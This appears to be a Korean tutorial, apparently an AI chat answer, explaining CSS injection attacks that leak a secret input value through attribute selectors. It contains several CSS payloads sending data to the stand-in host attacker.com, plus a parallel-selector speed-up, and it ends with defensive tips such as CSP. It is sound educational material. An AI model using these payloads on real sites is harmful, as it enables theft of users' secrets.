## CSS Injection (CSS-based exfiltration attack)

---

## 🧠 개념

### 1. CSS Injection이란?

웹 페이지에서 **사용자가 입력한 CSS 코드가 그대로 삽입**되어 실행될 수 있을 때, 공격자가 CSS를 조작해 정보를 유출할 수 있는 보안 취약점이에요.

| 선택자 구문          | 설명                                                                            |
| --------------- | ----------------------------------------------------------------------------- |
| `[attr]`        | `attr`이라는 이름의 \*\*속성(attribute)\*\*을 가진 모든 요소를 선택                             |
| `[attr=value]`  | `attr`의 값이 **정확히 `value`인 요소**를 선택                                            |
| `[attr~=value]` | `attr`의 값이 공백으로 구분된 여러 값 중에서 **`value`가 포함된 경우** 선택 (ex: class="btn primary") |
| `[attr^=value]` | `attr`의 값이 **`value`로 시작하는(접두사)** 요소를 선택                                      |
| `[attr$=value]` | `attr`의 값이 **`value`로 끝나는(접미사)** 요소를 선택                                       |
| `[attr*=value]` | `attr`의 값에 **`value`라는 문자열이 포함**되어 있으면 선택 (위치 상관 없음)                          |


---

## 😈 CSS를 이용해 정보를 훔친다고?

그렇습니다. CSS 자체는 **정보를 읽는 기능은 없지만**, **스타일 조건에 따라 외부 요청을 보낼 수는 있어요.**

예를 들어:

```html
input[name="secret"][value^="a"] {
  background: url("https://attacker.com/leak?q=a");
}
```

위 코드는:

* `name="secret"`인 `<input>` 태그가 있고
* 그 `value` 값이 **'a'로 시작한다면**
* **백그라운드 이미지 요청을 보냄** → `https://attacker.com/leak?q=a`

이렇게 조건이 참일 때만 외부로 요청이 나가기 때문에,
공격자는 해당 요청을 통해 **데이터가 a로 시작하는지 아닌지를 알 수 있는 거죠.**

---

## 🔍 구체적인 예시

웹 페이지에 이런 input이 있다고 가정합시다:

```html
<input name="secret" value="dawn_ctf{secret_flag}">
```

공격자가 삽입한 CSS:

```css
input[name="secret"][value^="d"] {
  background: url("https://attacker.com/leak?q=d");
}
```

서버는 background 이미지를 불러오려고 `https://attacker.com/leak?q=d`에 요청을 보냅니다.

그럼 공격자는 로그를 보고:

> "오, d로 시작하는구나!"

---

## ⏱️ 그런데 이게 비효율적인 이유는?

### 고전 방식: `[value^=문자열]`만 사용

* 예: 첫 번째 문자가 `a`, `b`, `c` ... `z` 중 어떤 건지 확인 → 26번 요청
* 두 번째 문자 확인 → 또 26번 요청
* 길이 20짜리 문자열이면 26 × 20 = **520번 요청**

---

## 🧠 더 똑똑한 방법: 글의 요점 정리

### ✅ 1. 접미사 선택자 (`[attr$=value]`) 도 같이 쓰기

* 예를 들어 문자열이 `"da"`라면:

  * `[value^="d"]` → d로 **시작**
  * `[value$="a"]` → a로 **끝남**
* 두 조건을 모두 만족해야 하므로 **정보 유출이 더 빠르게 가능**

```css
input[name="secret"][value^="d"][value$="a"] {
  background: url("https://attacker.com/leak?q=da");
}
```

### ✅ 2. 병렬 요청

하나의 CSS 파일에 수십 개 선택자를 넣어서 **동시에 여러 조건을 테스트** 가능

```css
<style>
input[name="secret"][value^="da"] { background: url(https://attacker.com/leak?q=da); }
input[name="secret"][value^="db"] { background: url(https://attacker.com/leak?q=db); }
input[name="secret"][value^="dc"] { background: url(https://attacker.com/leak?q=dc); }
/* ... */
</style>
```

* 이렇게 여러 줄 한꺼번에 넣으면
* 사용자가 웹 페이지를 열었을 때, 조건이 일치하는 **딱 한 개의 요청**만 서버로 감
* 공격자는 어떤 요청이 갔는지를 보고 **정확한 값**을 추론

---

## 🔧 요약 정리

| 개념            | 설명                         |
| ------------- | -------------------------- |
| CSS Injection | 사용자 입력을 통해 CSS를 주입하는 공격 방식 |
| 정보 유출 방식      | 조건부 선택자 + 외부 URL 요청        |
| \[value^=x]   | 해당 값이 x로 시작할 때             |
| \[value\$=x]  | 해당 값이 x로 끝날 때              |
| 병렬 요청         | 여러 조건을 동시에 테스트하여 속도 향상     |
| 최적화 이유        | 전체 요청 횟수를 줄이고 익스플로잇 속도 향상  |

---

## 💡 보안 관점 팁

이런 공격을 방지하려면:

* `<style>`이나 `style=` 같은 인라인 CSS 삽입을 **제한**
* 사용자 입력을 CSS로 **직접 출력하지 말 것**
* Content Security Policy(CSP)를 통해 외부 요청을 제한
* 서버 로그를 통해 의심스러운 요청 감지

---

궁금한 부분 있으면 더 설명해줄게요. 예제나 시각화도 가능해요!
